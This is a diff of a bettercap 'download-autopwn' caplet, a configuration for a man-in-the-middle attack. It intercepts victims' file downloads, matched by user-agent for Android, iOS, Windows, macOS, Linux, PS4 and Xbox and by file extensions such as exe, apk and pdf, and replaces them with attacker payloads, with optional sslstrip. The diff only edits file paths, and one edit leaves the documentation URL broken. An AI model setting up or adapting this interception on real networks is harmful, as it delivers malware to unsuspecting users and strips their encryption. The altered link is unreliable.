@@ -1,4 +1,4 @@
-# documentation can be found at https://github.com/bettercap/caplets/blob/master/download-autopwn/README.md
+# documentation can be found at https://github.com/bettercap/blob/master/download-autopwn/README.md
 # 
 # this module lets you intercept very specific download requests and replaces the payload with one of your choice
 #
@@ -6,10 +6,10 @@
 #    1. the victim's user-agent string must match the downloadautopwn.useragent.x regexp value
 #    2. the requested file must match one of the downloadautopwn.extensions.x file extensions
 #
-# you can find the downloadautopwn.devices in the caplets/download-autopwn/ folder (you can add your own)
+# you can find the downloadautopwn.devices in the download-autopwn/ folder (you can add your own)
 #
 
-# choose the devices from which downloads get pwned (enter the dir names of choice from caplets/download-autopwn/)
+# choose the devices from which downloads get pwned (enter the dir names of choice from download-autopwn/)
 # (or feel free to add your own)
 set downloadautopwn.devices android,ios,linux,macos,ps4,windows,xbox
 
@@ -23,7 +23,7 @@ set downloadautopwn.useragent.ps4      PlayStation 4
 set downloadautopwn.useragent.windows  Windows|WOW64
 set downloadautopwn.useragent.xbox     Xbox
 
-# choose which file extensions get intercepted and replaced by your payload on specific devices (payloads are in caplets/download-autopwn/.../)
+# choose which file extensions get intercepted and replaced by your payload on specific devices (payloads are in download-autopwn/.../)
 # (again, you can add as many as you want)
 # make sure the payload files exist and that they are all named "payload" (for example: payload.exe)
 set downloadautopwn.extensions.android  apk,pdf,sh,pfx,zip
@@ -38,7 +38,7 @@ set downloadautopwn.extensions.xbox     exe,msi,jar,pdf,doc,docx,zip
 set downloadautopwn.resizepayloads true
 
 # set download-autopwn.js as proxy script
-set http.proxy.script caplets/download-autopwn.js
+set http.proxy.script download-autopwn.js
 # uncomment if you want sslstrip enabled
 # set http.proxy.sslstrip true
 # start proxy
